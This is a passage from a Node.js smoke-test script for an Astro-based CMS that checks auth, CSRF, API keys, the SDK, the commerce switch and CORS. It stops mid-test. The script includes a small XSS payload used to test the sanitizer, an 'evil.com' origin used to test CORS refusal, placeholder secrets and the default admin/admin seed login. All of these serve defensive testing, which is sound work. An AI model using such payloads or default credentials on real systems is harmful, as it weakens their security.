#!/usr/bin/env node
/**
 * End-to-end smoke test. Spawns `astro dev`, exercises the critical paths,
 * and exits non-zero on the first failure. Used by CI and locally
 * (`npm run smoke`).
 *
 * Scope: enough to catch deploys that broke auth, content APIs, or SSR.
 * Not a full integration suite.
 */
import { spawn } from 'node:child_process';
import { setTimeout as wait } from 'node:timers/promises';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import http from 'node:http';
import crypto from 'node:crypto';
import { transform, build } from 'esbuild';

const __here = path.dirname(fileURLToPath(import.meta.url));

/**
 * Spin up a localhost HTTP server that records incoming webhook deliveries
 * (method, headers, raw body). Returns { url, deliveries, waitFor, close }.
 */
async function startWebhookReceiver(respond) {
  const deliveries = [];
  const waiters = [];
  const server = http.createServer((req, res) => {
    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', () => {
      const d = { method: req.method, headers: req.headers, body: raw };
      deliveries.push(d);
      waiters.splice(0).forEach((w) => w(d));
      // `respond(deliveryCount)` may return a status code to script failures;
      // defaults to 200.
      const status = (typeof respond === 'function' ? respond(deliveries.length) : 200) || 200;
      res.writeHead(status, { 'Content-Type': 'application/json' });
      res.end(status >= 200 && status < 300 ? '{"ok":true}' : '{"error":true}');
    });
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address();
  return {
    url: `http://127.0.0.1:${port}/hook`,
    deliveries,
    /** Resolve with the next delivery, or null after `ms`. */
    waitFor(ms = 5000) {
      if (deliveries.length) return Promise.resolve(deliveries[deliveries.length - 1]);
      return new Promise((resolve) => {
        const t = setTimeout(() => resolve(null), ms);
        waiters.push((d) => {
          clearTimeout(t);
          resolve(d);
        });
      });
    },
    /**
     * Resolve with the first delivery MATCHING `predicate`, or null after `ms`.
     *
     * `waitFor` returns the last delivery already in the queue, which makes it
     * usable only for the first email a run sends: any later caller silently
     * receives an earlier test's message. That is not hypothetical — the
     * magic-link assertion passed locally (its email happened to arrive first)
     * and failed in CI, where the slower run left the password-reset email
     * sitting at the end of the queue. Matching on the message itself removes
     * the ordering dependence entirely.
     */
    async waitForMatching(predicate, ms = 8000) {
      const deadline = Date.now() + ms;
      let seen = 0;
      for (;;) {
        for (; seen < deliveries.length; seen += 1) {
          const d = deliveries[seen];
          let parsed = null;
          try { parsed = JSON.parse(d.body); } catch { /* not ours */ }
          if (parsed && predicate(parsed)) return parsed;
        }
        if (Date.now() >= deadline) return null;
        await new Promise((r) => setTimeout(r, 50));
      }
    },
    /** Resolve once at least `n` deliveries have arrived (or false after `ms`). */
    async waitForCount(n, ms = 5000) {
      const deadline = Date.now() + ms;
      while (deliveries.length < n) {
        if (Date.now() > deadline) return false;
        await wait(50);
      }
      return true;
    },
    close: () => new Promise((resolve) => server.close(resolve)),
  };
}

/** Transpile + import the TypeScript SDK so the smoke run exercises the real client. */
async function loadClient() {
  const src = await fs.readFile(path.join(__here, '..', 'src/client/index.ts'), 'utf8');
  const { code } = await transform(src, { loader: 'ts', format: 'esm' });
  const tmp = path.join(os.tmpdir(), `astrobaas-client-smoke-${process.pid}.mjs`);
  await fs.writeFile(tmp, code);
  const mod = await import(pathToFileURL(tmp).href);
  await fs.rm(tmp, { force: true });
  return mod;
}

/** Transpile + import the head sanitizer to assert its allowlist directly. */
async function loadSanitize() {
  // Must live inside the project so the bundle's external `sanitize-html`
  // import still resolves through node_modules.
  const cacheDir = path.join(__here, '..', 'node_modules', '.cache');
  await fs.mkdir(cacheDir, { recursive: true });
  const tmp = path.join(cacheDir, `astrobaas-sanitize-smoke-${process.pid}.mjs`);
  await build({
    entryPoints: [path.join(__here, '..', 'src/lib/sanitize.ts')],
    bundle: true,
    format: 'esm',
    platform: 'node',
    packages: 'external',
    outfile: tmp,
    logLevel: 'silent',
  });
  const mod = await import(pathToFileURL(tmp).href);
  await fs.rm(tmp, { force: true });
  return mod;
}

/** Transpile + import the real TOTP lib so the smoke computes codes the server accepts. */
async function loadTotp() {
  const src = await fs.readFile(path.join(__here, '..', 'src/lib/totp.ts'), 'utf8');
  const { code } = await transform(src, { loader: 'ts', format: 'esm' });
  const tmp = path.join(os.tmpdir(), `astrobaas-totp-smoke-${process.pid}.mjs`);
  await fs.writeFile(tmp, code);
  const mod = await import(pathToFileURL(tmp).href);
  await fs.rm(tmp, { force: true });
  return mod;
}

/**
 * Transpile + import the real receipt signer, so the smoke mints tokens the
 * SERVER accepts — the same reason `loadTotp` exists.
 *
 * Reimplementing the HMAC here would be a second copy of the signing rule, and
 * the copy that drifts is the one that makes the test pass for the wrong
 * reason. `AUTH_SECRET` is set to the server's own value first, because the
 * bundled module reads it at call time.
 */
async function loadReceipt() {
  process.env.AUTH_SECRET = SMOKE_AUTH_SECRET;
  const cacheDir = path.join(__here, '..', 'node_modules', '.cache');
  await fs.mkdir(cacheDir, { recursive: true });
  const tmp = path.join(cacheDir, `astrobaas-receipt-smoke-${process.pid}.mjs`);
  await build({
    entryPoints: [path.join(__here, '..', 'src/lib/commerce/receipt.ts')],
    bundle: true, format: 'esm', platform: 'node', packages: 'external',
    outfile: tmp, logLevel: 'silent',
  });
  const mod = await import(pathToFileURL(tmp).href);
  await fs.rm(tmp, { force: true });
  return mod;
}

/**
 * Solve a proof-of-work challenge exactly the way /captcha.js does: the first
 * nonce n for which SHA-256("<token>.<n>") starts with `bits` zero bits.
 * Returns the `pow_token` value, or '' if none was found.
 */
function solvePow(token, bits) {
  const zeroBits = (digest) => {
    let remaining = bits;
    for (let i = 0; i < digest.length && remaining > 0; i++) {
      const take = Math.min(8, remaining);
      if (digest[i] >>> (8 - take) !== 0) return false;
      remaining -= take;
    }
    return remaining <= 0;
  };
  for (let n = 0; n < 30_000_000; n++) {
    if (zeroBits(crypto.createHash('sha256').update(`${token}.${n}`).digest())) return `${token}::${n}`;
  }
  return '';
}

/**
 * Wait until the next fixed 15-minute window boundary is at least `margin` ms
 * away. The libSQL rate-limit store floors its windows to epoch multiples, so
 * a counting assertion that straddled a boundary would see its counter reset
 * halfway and fail for no reason. The memory store is unaffected by the wait.
 */
async function clearOfLoginWindowBoundary(margin = 20_000) {
  const W = 15 * 60_000;
  const left = W - (Date.now() % W);
  if (left < margin) await wait(left + 250);
}

/** The Set-Cookie values a response carries, as an array. */
const setCookies = (r) => r.headers.getSetCookie?.() ?? [r.headers.get('set-cookie') ?? ''];
/** `name=value` for one cookie a response set, or ''. */
const cookieFrom = (r, name) => {
  const c = setCookies(r).find((x) => x.startsWith(`${name}=`));
  return c ? c.split(';')[0] : '';
};

// Each driver gets its OWN port. The three smoke runs execute back to back in
// CI, and a server that outlives its run would otherwise be found by the NEXT
// run's readiness probe — which answers 200, passes the probe, then dies
// mid-request as a bare ECONNRESET. Different ports make that impossible
// rather than unlikely.
const PORT = process.env.SMOKE_PORT
  || (process.env.SMOKE_RELATIONAL ? '4323'
    : process.env.SMOKE_DATABASE_URL ? '4322'
      : '4321');
const BASE = `http://127.0.0.1:${PORT}`;
// One constant: the server's env and `loadReceipt` must sign with the SAME
// secret, and two string literals is how they stop doing that.
const SMOKE_AUTH_SECRET = 'smoke-test-secret-please-change';
const TIMEOUT = 60_000;

// Run against an ISOLATED temp DB/uploads dir so the smoke test never touches a
// developer's real repo-root db.json (it resets the DB to get the seed admin).
const SMOKE_DB = path.join(os.tmpdir(), `astrobaas-smoke-db-${process.pid}.json`);
const SMOKE_LIBSQL = path.join(os.tmpdir(), `astrobaas-smoke-${process.pid}.db`);
const SMOKE_UPLOADS = path.join(os.tmpdir(), `astrobaas-smoke-uploads-${process.pid}`);

let passed = 0;
let failed = 0;

function ok(name) {
  console.log(`✓ ${name}`);
  passed += 1;
}
function fail(name, msg) {
  console.error(`✗ ${name}: ${msg}`);
  failed += 1;
}

async function waitForServer() {
  const deadline = Date.now() + TIMEOUT;
  while (Date.now() < deadline) {
    try {
      const r = await fetch(`${BASE}/login`);
      if (r.ok) return true;
    } catch {
      /* not ready */
    }
    await wait(500);
  }
  return false;
}

/**
 * Refuse to run against a server this process did not start.
 *
 * A stale server from a previous run answers the readiness probe, so the suite
 * proceeds against the WRONG database and driver, then fails with an
 * inscrutable ECONNRESET when the stale process finally dies. Failing here
 * instead names the actual problem.
 */
async function assertPortFree() {
  try {
    const r = await fetch(`${BASE}/login`, { signal: AbortSignal.timeout(2000) });
    console.error(
      `\nRefusing to start: something is ALREADY serving ${BASE} (HTTP ${r.status}).\n` +
      `That is almost certainly a dev server left over from an earlier run.\n` +
      `The suite would have tested it instead of a fresh one.\n` +
      `Kill it first:  pkill -f "astro dev --port ${PORT}"\n`);
    process.exit(2);
  } catch {
    /* nothing listening — this is the good path */
  }
}

async function main() {
  await assertPortFree();
  // Reset the ISOLATED temp DB so login uses the seed admin/admin pair. Never
  // delete the repo-root db.json (a developer's real data).
  await fs.rm(SMOKE_DB, { force: true });
  await fs.rm(SMOKE_UPLOADS, { recursive: true, force: true });

  // Driver under test (the same suite covers all engines):
  //   default          → lowdb JSON file
  //   SMOKE_DATABASE_URL → libSQL doc-blob adapter
  //   SMOKE_RELATIONAL   → relational SqlStorage (per-entity rows)
  // The libSQL-backed modes start from a fresh temp SQLite file and drop DB_PATH.
  const useRelational = !!process.env.SMOKE_RELATIONAL;
  const useLibsql = !!process.env.SMOKE_DATABASE_URL || useRelational;
  if (useLibsql) await fs.rm(SMOKE_LIBSQL, { force: true });

  // Capture outgoing email via the webhook transport so the password-reset flow
  // can be exercised end-to-end. Must exist BEFORE the server spawns (its URL is
  // passed in the env).
  const emailReceiver = await startWebhookReceiver();

  const serverEnv = {
    ...process.env,
    AUTH_SECRET: SMOKE_AUTH_SECRET,
    UPLOADS_DIR: SMOKE_UPLOADS,
    CORS_ORIGINS: 'https://frontend.example.com',
    // Exercise i18n end-to-end. NOTE: this makes the smoke run a MULTILINGUAL
    // install, so localized routing is active too.
    // Four, including a NON-LATIN script and a RIGHT-TO-LEFT one. Two Latin
    // locales would have let a Greek product name pass every assertion while
    // breaking on a real shop — sorting, folding and localeCompare all behave
    // differently outside ASCII. `ar` is here so the writing direction (C-135)
    // is exercised by a real request rather than by reading the stylesheet.
    SITE_LOCALES: 'en,de,el,ar',
    SITE_DEFAULT_LOCALE: 'en',
    EMAIL_TRANSPORT: 'webhook',
    EMAIL_WEBHOOK_URL: emailReceiver.url,
    // Fast webhook retry backoff so the durability test runs quickly.
    WEBHOOK_RETRY_DELAYS_MS: '100,200,300',
    // The suite's webhook/email receivers listen on 127.0.0.1 — allow private
    // targets here (the SSRF guard itself is unit-tested in lib.test.mjs).
    WEBHOOK_ALLOW_PRIVATE: '1',
    // Expose Prometheus metrics so the smoke can assert /metrics.
    METRICS_ENABLED: '1',
    // Fast scheduled-post sweep so the worker test runs quickly.
    SCHEDULER_INTERVAL_MS: '250',
    // The suite makes many API calls from one IP; lift the per-IP API rate limit
    // so it doesn't cause collateral 429s. (The LOGIN throttle is a separate
    // mechanism and is still exercised in its own test.)
    RATE_LIMIT_PER_MIN: '100000',
    // The STAFF limiter is separate and defaults to 600/min. This suite makes
    // well over a thousand authenticated calls in a single minute, and every
    // block added since has walked it closer to the ceiling — a 429 here fails
    // whatever test happens to run last, which reads as that feature being
    // broken. Raised for the same reason as the general one: one client
    // pretending to be a whole shop's traffic.
    STAFF_RATE_LIMIT_PER_MIN: '100000',
    // The per-IP ROUTE ceilings (S3.4) default to 10–30/min, and this suite
    // places, quotes and searches far more often than a shopper from one
    // address. Lifted — but each to a DISTINCT value, below the API-key bucket
    // (6000) and far below the two above, so `RateLimit-Limit` (which names the
    // bucket closest to refusing) tells block 7c2 exactly which buckets a
    // request was charged to. The ten-a-minute refusal itself is proved
    // against the real store in tests/request-limits.test.mjs.
    RATE_LIMIT_CHECKOUT_PER_MIN: '3001',
    RATE_LIMIT_QUOTE_PER_MIN: '3002',
    RATE_LIMIT_PAYMENT_START_PER_MIN: '3003',
    RATE_LIMIT_SEARCH_PER_MIN: '3004',
    RATE_LIMIT_WEBHOOK_PER_MIN: '3005',
    // Enable Stripe so the webhook -> capture -> order-state chain runs for
    // real. Stripe's verification is a local HMAC with no network call, so the
    // security-critical path is fully exercisable offline with a fake secret.
    // (Session CREATION would need Stripe's API and is not attempted here.)
    // Two conditions gate a provider: named here AND its requiredEnv present.
    // Both are exercised — test-gateway has its key set below, and the smoke
    // asserts it reaches checkout.
    PAYMENTS_ENABLED: 'stripe,test-gateway',
    STRIPE_SECRET_KEY: 'sk_test_smoke_not_a_real_key',
    STRIPE_WEBHOOK_SECRET: 'whsec_smoke_secret',
    // Keep the dev server in the FOREGROUND, where this harness can kill it.
    //
    // Astro 7 sniffs for an agentic environment (via `am-i-vibing`) and, when it
    // finds one, silently daemonizes the dev server. A daemon is not in the
    // spawned process group, so the SIGTERM in cleanup() below misses it: the
    // server outlives the run, keeps the port, and holds the project-wide lock
    // that then refuses the next driver's run. That is not hypothetical — it is
    // what this suite did the first time it met Astro 7.
    //
    // Astro's own opt-out is this variable: `agentDetected` is computed as
    // `!process.env.ASTRO_DEV_BACKGROUND && isRunByAgent()`, so ANY non-empty
    // value means "the caller decides, stop guessing". It does NOT switch
    // background on — only the `--background` flag does that, and we never pass
    // it. The value is deliberately '0' to read as "background: no".
    //
    // Without this the suite passes when a human runs it and fails when an agent
    // does, which for a CMS that courts agent-driven development is the worst
    // possible place to have an environment-dependent test.
    ASTRO_DEV_BACKGROUND: '0',
    // A stand-in for a paid module. The real ones are proprietary and live in a
    // private repo that public CI cannot install, so this fixture exercises the
    // same path: an external module, several plugins in one package, and a
    // plugin-contributed payment provider.
    ASTROBAAS_PLUGINS: './tests/fixtures/external-plugin/index.mjs',
    ASTROBAAS_PLUGINS_ACTIVATE: 'test-gateway,test-second-module,test-platform',
    TEST_GATEWAY_KEY: 'smoke-only-not-a-real-key',
  };
  if (useLibsql) serverEnv.DATABASE_URL = `file:${SMOKE_LIBSQL}`;
  else serverEnv.DB_PATH = SMOKE_DB;
  if (useRelational) serverEnv.DATABASE_DRIVER = 'relational';
  // Exercise the shared libSQL-backed rate-limiter live whenever a libSQL DB is
  // configured (the whole suite runs through its hit() path).
  if (useLibsql) serverEnv.RATE_LIMIT_STORE = 'libsql';

  // `--ignore-lock` is required from Astro 7 on.
  //
  // Astro 7 added a PROJECT-WIDE dev-server lock: `astro dev` checks whether any
  // server is already running for this project and, if so, prints "Dev server
  // already running" and exits 0 without serving. That lock knows nothing about
  // ports, so with three drivers on three ports (4321/4322/4323) the second and
  // third runs of this suite were refused by the first — and because the refusal
  // exits 0, it surfaced as a bare "server EXITED (code=0)" rather than as
  // anything resembling its cause.
  //
  // The lock is the wrong granularity for this harness, not a safety net it
  // needs: assertPortFree() above already refuses to run against a server this
  // process did not start, and it checks the PORT, which is the thing that
  // actually determines which database the suite would talk to. `--ignore-lock`
  // also skips WRITING the lock, so a killed server cannot strand a stale one
  // that blocks the next run.
  const server = spawn('npx', ['astro', 'dev', '--port', PORT, '--host', '127.0.0.1', '--ignore-lock'], {
    env: serverEnv,
    stdio: ['ignore', 'pipe', 'pipe'],
    // `npx` is a wrapper around the real astro process. Killing the wrapper
    // alone orphans the child, which keeps holding the port after this run
    // exits. Detaching gives us a process GROUP we can signal as a unit.
    detached: true,
  });
  let serverLog = '';
  server.stdout.on('data', (c) => (serverLog += c.toString()));
  server.stderr.on('data', (c) => (serverLog += c.toString()));

  const cleanup = () => {
    try {
      // Negative pid = the whole group, so the astro child dies with the
      // wrapper instead of surviving as an orphan.
      process.kill(-server.pid, 'SIGTERM');
    } catch {
      try { server.kill('SIGTERM'); } catch { /* ignore */ }
    }
    emailReceiver.close().catch(() => {});
  };
  process.on('exit', cleanup);
  process.on('SIGINT', () => {
    cleanup();
    process.exit(130);
  });

  // A server that dies AFTER the readiness probe used to surface as a bare
  // `TypeError: fetch failed` with the server's own output discarded — which is
  // how a CI failure stayed undiagnosable. Record the exit and dump the log on
  // any crash, so the next one explains itself.
  let serverExit = null;
  server.on('exit', (code, signal) => { serverExit = { code, signal }; });

  const dumpServer = (label) => {
    console.error(`\n=== ${label} ===`);
    if (serverExit) {
      console.error(`The dev server EXITED (code=${serverExit.code} signal=${serverExit.signal}).`);
    } else {
      console.error('The dev server is still running; the request failed for another reason.');
    }
    console.error('Last server output:\n' + (serverLog.slice(-4000) || '(the server produced no output)'));
  };

  for (const ev of ['uncaughtException', 'unhandledRejection']) {
    process.on(ev, (e) => {
      dumpServer(`smoke aborted on ${ev}: ${e?.message ?? e}`);
      cleanup();
      process.exit(2);
    });
  }

  if (!(await waitForServer())) {
    dumpServer('Server did not start within 60s');
    cleanup();
    process.exit(2);
  }

  // 1. Public home
  {
    const r = await fetch(`${BASE}/`);
    if (r.status === 200) ok('GET / → 200');
    else fail('GET /', `status=${r.status}`);
  }

  // 2. Login page
  {
    const r = await fetch(`${BASE}/login`);
    if (r.status === 200) ok('GET /login → 200');
    else fail('GET /login', `status=${r.status}`);
  }

  // 3. Admin requires auth
  {
    const r = await fetch(`${BASE}/admin`, { redirect: 'manual' });
    if (r.status === 302) ok('GET /admin (no auth) → 302');
    else fail('GET /admin', `expected 302, got ${r.status}`);
  }

  // 4. Login flow
  let sessionCookie = '';
  let csrfToken = '';
  {
    const body = new URLSearchParams({ email: 'admin@local', password: 'admin', next: '/admin' });
    const r = await fetch(`${BASE}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body,
      redirect: 'manual',
    });
    if (r.status !== 303) {
      fail('POST /api/auth/login', `expected 303, got ${r.status}`);
    } else {
      const setCookies = r.headers.getSetCookie?.() ?? [r.headers.get('set-cookie') ?? ''];
      for (const c of setCookies) {
        const m = c.match(/(astrobaas_session|astrobaas_csrf)=([^;]+)/);
        if (!m) continue;
        if (m[1] === 'astrobaas_session') sessionCookie = `astrobaas_session=${m[2]}`;
        if (m[1] === 'astrobaas_csrf') csrfToken = decodeURIComponent(m[2]);
      }
      if (sessionCookie && csrfToken) ok('Login set session + csrf cookies');
      else fail('Login set session + csrf cookies', `session=${!!sessionCookie} csrf=${!!csrfToken}`);
    }
  }

  // 5. /api/auth/me
  if (sessionCookie) {
    const r = await fetch(`${BASE}/api/auth/me`, { headers: { Cookie: sessionCookie } });
    const j = await r.json().catch(() => null);
    if (r.status === 200 && j?.success && j.data?.email === 'admin@local') {
      ok('GET /api/auth/me returns current user');
    } else {
      fail('GET /api/auth/me', JSON.stringify(j));
    }
  }

  // 6. POST /api/posts without CSRF → 403
  if (sessionCookie) {
    const r = await fetch(`${BASE}/api/posts`, {
      method: 'POST',
      headers: { Cookie: sessionCookie, 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: 'no csrf' }),
    });
    if (r.status === 403) ok('POST /api/posts without CSRF → 403');
    else fail('POST /api/posts without CSRF', `expected 403, got ${r.status}`);
  }

  // 6b. Commerce master switch. A fresh install is NOT a shop: the public
  // commerce surface must answer 404 as if it never existed — while a staff
  // session still gets honest answers. Then the switch is flipped on (the way
  // an operator would) so every commerce assertion below runs against a shop.
  if (sessionCookie && csrfToken) {
    const anonOff = await fetch(`${BASE}/api/products`);
    if (anonOff.status === 404) ok('commerce off: anonymous GET /api/products → 404');
    else fail('commerce off: anonymous GET /api/products', `expected 404, got ${anonOff.status}`);

    const staffOff = await fetch(`${BASE}/api/products`, { headers: { Cookie: sessionCookie } });
    if (staffOff.status === 200) ok('commerce off: staff GET /api/products still answers');
    else fail('commerce off: staff GET /api/products', `expected 200, got ${staffOff.status}`);

    // A least-privilege API key scoped AWAY from commerce must NOT slip past
    // the switch. Its role (editor) could read commerce, but its scope cannot
    // — and the switch must see the effective principal, not the raw role.
    const keyMint = await fetch(`${BASE}/api/keys`, {
      method: 'POST',
      headers: { Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`, 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
      body: JSON.stringify({ name: 'smoke-blog-key', role: 'editor', scopes: ['posts:read'] }),
    });
    const scopedKey = (await keyMint.json().catch(() => null))?.data?.key;
    if (scopedKey) {
      const bypass = await fetch(`${BASE}/api/products`, { headers: { Authorization: `Bearer ${scopedKey}` } });
      if (bypass.status === 404) ok('commerce off: a non-commerce-scoped API key gets 404, not the catalogue');
      else fail('commerce off: scoped-key bypass', `expected 404, got ${bypass.status}`);
      // The commerce-off 404 must carry the SAME middleware decoration every
      // other API 404 gets — RateLimit-* and nosniff — and the generic
      // route-not-found body. A bare early-return would skip decoration, and
      // the absent RateLimit headers alone would fingerprint /api/products as
      // real-but-gated rather than nonexistent. Baseline: a decorated 404 from
      // a real handler (missing post) proves the headers are present.
      const gated = await fetch(`${BASE}/api/products`);
      const baseline = await fetch(`${BASE}/api/posts/definitely-not-a-real-slug-xyz`);
      const gbody = await gated.json().catch(() => null);
      const rlGated = gated.headers.get('ratelimit-limit');
      const rlBase = baseline.headers.get('ratelimit-limit');
      const nsMatch = gated.headers.get('x-content-type-options') === baseline.headers.get('x-content-type-options');
      if (gated.status === 404 && !!rlGated && !!rlBase && nsMatch
          && gbody?.success === false && gbody?.error?.code === 'NOT_FOUND') {
        ok('commerce off: gated 404 carries normal API-404 decoration (no header fingerprint)');
      } else fail('commerce 404 fingerprint', `rl:${rlGated}/${rlBase} ns=${nsMatch} body=${JSON.stringify(gbody)}`);
    }

    const flip = await fetch(`${BASE}/api/settings/update`, {
      method: 'POST',
      headers: {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      },
      body: JSON.stringify({ commerce_enabled: true }),
    });
    if (flip.status === 200) ok('commerce switch: enabled via settings API');
    else fail('commerce switch: enable', `expected 200, got ${flip.status}`);

    const anonOn = await fetch(`${BASE}/api/products`);
    if (anonOn.status === 200) ok('commerce on: anonymous GET /api/products → 200');
    else fail('commerce on: anonymous GET /api/products', `expected 200, got ${anonOn.status}`);

  }

  // 6c. Defining a content type must put its door in the menu: no collection
  // without a screen, no screen without a link.
  if (sessionCookie && csrfToken) {
    const authed = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const put = await fetch(`${BASE}/api/content-types`, {
      method: 'PUT',
      headers: authed,
      body: JSON.stringify([{
        name: 'smoke-note', label: 'Smoke note', labelPlural: 'Smoke notes',
        fields: [{ name: 'title', rule: { type: 'string', min: 1, max: 100 } }],
      }]),
    });
    if (put.status === 200) ok('content types: PUT registers a type');
    else fail('content types PUT', `expected 200, got ${put.status}`);

    const adminHtml = await (await fetch(`${BASE}/admin`, { headers: { Cookie: sessionCookie } })).text();
    if (adminHtml.includes('/admin/content/smoke-note') && adminHtml.includes('Smoke notes')) {
      ok('content types: the new collection appears in the sidebar');
    } else fail('content types sidebar link', 'no /admin/content/smoke-note link in /admin HTML');

    const screen = await fetch(`${BASE}/admin/content/smoke-note`, { headers: { Cookie: sessionCookie } });
    if (screen.status === 200) ok('content types: the generated entries screen answers');
    else fail('content types entries screen', `expected 200, got ${screen.status}`);

    await fetch(`${BASE}/api/content-types`, { method: 'PUT', headers: authed, body: '[]' });
    const goneHtml = await (await fetch(`${BASE}/admin`, { headers: { Cookie: sessionCookie } })).text();
    if (!goneHtml.includes('/admin/content/smoke-note')) ok('content types: deleting the type removes its menu entry');
    else fail('content types menu cleanup', 'link still present after PUT []');
  }

  // 7. POST /api/posts with CSRF → 201 + sanitized content
  let createdPostId = '';
  if (sessionCookie && csrfToken) {
    const payload = {
      title: 'Smoke test post',
      status: 'draft',
      publish_date: '2030-01-02T03:04',
      content:
        '<p>Hello</p><script>alert(1)</script><a href="javascript:bad()">x</a><a href="https://example.com" target="_blank">ok</a>',
    };
    const r = await fetch(`${BASE}/api/posts`, {
      method: 'POST',
      headers: {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      },
      body: JSON.stringify(payload),
    });
    const j = await r.json().catch(() => null);
    if (r.status === 201 && j?.success && j.data?.id) {
      createdPostId = j.data.id;
      if (!/script>/i.test(j.data.content) && !/javascript:/.test(j.data.content)) {
        ok('POST /api/posts → 201, content sanitized');
      } else {
        fail('POST /api/posts sanitize', j.data.content);
      }
      if (j.data.publish_date === '2030-01-02T03:04') ok('POST /api/posts persists publish_date');
      else fail('POST /api/posts publish_date', `got ${j.data.publish_date}`);
    } else {
      fail('POST /api/posts (with CSRF)', `status=${r.status} body=${JSON.stringify(j)}`);
    }
  }

  // 7b. API-key / bearer auth (headless, cross-origin). Mint a key via the
  // cookie session, then use it as a bearer token to write WITHOUT CSRF.
  if (sessionCookie && csrfToken) {
    const hdrs = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const mint = await fetch(`${BASE}/api/keys`, {
      method: 'POST',
      headers: hdrs,
      body: JSON.stringify({ name: 'smoke-key', role: 'editor' }),
    });
    const mj = await mint.json().catch(() => null);
    const apiKey = mj?.data?.key;
    if (mint.status === 201 && typeof apiKey === 'string' && apiKey.startsWith('abk_')) {
      ok('POST /api/keys mints a key (secret returned once)');
    } else {
      fail('POST /api/keys', `status=${mint.status} ${JSON.stringify(mj)}`);
    }

    if (apiKey) {
      // Bearer write with NO CSRF token and NO cookie → must succeed (201).
      const cr = await fetch(`${BASE}/api/posts`, {
        method: 'POST',
        headers: { Authorization: `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'Created via API key', status: 'draft' }),
      });
      if (cr.status === 201) ok('bearer API key authenticates a write (CSRF-exempt)');
      else fail('bearer write', `expected 201, got ${cr.status}`);

      // A bogus bearer token must NOT authenticate (401).
      const bad = await fetch(`${BASE}/api/posts`, {
        method: 'POST',
        headers: { Authorization: 'Bearer abk_not-a-real-key', 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: 'nope' }),
      });
      if (bad.status === 401) ok('invalid bearer key → 401');
      else fail('invalid bearer key', `expected 401, got ${bad.status}`);

      // GET /api/keys never leaks the hash.
      const list = await fetch(`${BASE}/api/keys`, { headers: { Cookie: sessionCookie } });
      const lj = await list.json().catch(() => null);
      const leaks = Array.isArray(lj?.data) && lj.data.some((k) => 'key_hash' in k || 'key' in k);
      if (list.status === 200 && !leaks) ok('GET /api/keys lists metadata without secrets');
      else fail('GET /api/keys', `status=${list.status} leaks=${leaks}`);

      // 7b-SDK. Drive the real `astrobaas/client` SDK against the live server
      // using the minted key — proves the typed client + bearer flow end-to-end.
      try {
        const { createClient, AstroBaasError } = await loadClient();
        const baas = createClient(BASE, { apiKey });
        const created = await baas.posts.create({ title: 'Created via SDK', status: 'draft' });
        if (created?.id && created.title === 'Created via SDK') ok('SDK posts.create() writes via bearer key');
        else fail('SDK posts.create', JSON.stringify(created));

        const listed = await baas.posts.list({ limit: 5 });
        if (Array.isArray(listed)) ok('SDK posts.list() unwraps the data array');
        else fail('SDK posts.list', `not an array: ${JSON.stringify(listed)}`);

        const pageOne = await baas.posts.page({ limit: 1 });
        if (Array.isArray(pageOne.items) && typeof pageOne.total === 'number' && typeof pageOne.hasMore === 'boolean')
          ok('SDK posts.page() returns items + pagination meta');
        else fail('SDK posts.page', JSON.stringify(pageOne));

        // Update + delete the SDK-created post via the new RESTful methods.
        if (created?.id) {
          const edited = await baas.posts.update(created.id, { title: 'Edited via SDK', status: 'published' });
          if (edited?.title === 'Edited via SDK' && edited?.status === 'published') ok('SDK posts.update() edits via bearer key');
          else fail('SDK posts.update', JSON.stringify(edited));

          await baas.posts.remove(created.id);
          let gone = false;
          try {
            await baas.posts.get(created.id);
          } catch (e) {
            gone = e instanceof AstroBaasError && e.status === 404;
          }
          if (gone) ok('SDK posts.remove() deletes (get → 404 after)');
          else fail('SDK posts.remove', 'post still retrievable');
        }

        const who = await baas.auth.me();
        if (who?.role) ok('SDK auth.me() resolves the key principal');
        else fail('SDK auth.me', JSON.stringify(who));

        // A bad key must make the SDK throw a typed AstroBaasError(401).
        const bogus = createClient(BASE, { apiKey: 'abk_not-a-real-key' });
        let sdkErr = null;
        try {
          await bogus.posts.create({ title: 'nope' });
        } catch (e) {
          sdkErr = e;
        }
        if (sdkErr instanceof AstroBaasError && sdkErr.status === 401)
          ok('SDK throws AstroBaasError(401) on a bad key');
        else fail('SDK error mapping', `got ${sdkErr?.name}/${sdkErr?.status}`);
      } catch (e) {
        fail('SDK live integration', String(e?.stack || e));
      }
    }
  }

  // 7c. CORS header echo for an allowed origin (headless clients). NOTE: the
  // OPTIONS preflight is verified against the production build separately —
  // under `astro dev` Vite's own dev middleware answers OPTIONS before our
  // middleware, so we assert the GET/actual-response path here (that's what our
  // middleware controls and what proves the allowlist works).
  {
    const g = await fetch(`${BASE}/api/posts`, { headers: { Origin: 'https://frontend.example.com' } });
    if (g.headers.get('access-control-allow-origin') === 'https://frontend.example.com') ok('CORS header echoed on API response for allowed origin');
    else fail('CORS GET header', g.headers.get('access-control-allow-origin') || '(none)');

    const evil = await fetch(`${BASE}/api/posts`, { headers: { Origin: 'https://evil.com' } });
    if (!evil.headers.get('access-control-allow-origin')) ok('CORS withheld from unlisted origin');
    else fail('CORS leak', evil.headers.get('access-control-allow-origin'));
  }

  // 7c2. Request limits and the CSRF cookie (S3.4, S3.6, S3.7, S3.13).
  //
  // The route ceilings are set to distinct values in serverEnv (checkout 3001,
  // quote 3002, payment start 3003, search 3004, webhooks 3005; API keys 6000;
  // anonymous and staff 100000). RateLimit-Limit names the bucket closest to
  // refusing, so its value says which buckets a request was charged to.
  if (sessionCookie && csrfToken) {
    const STORE = 'https://frontend.example.com';
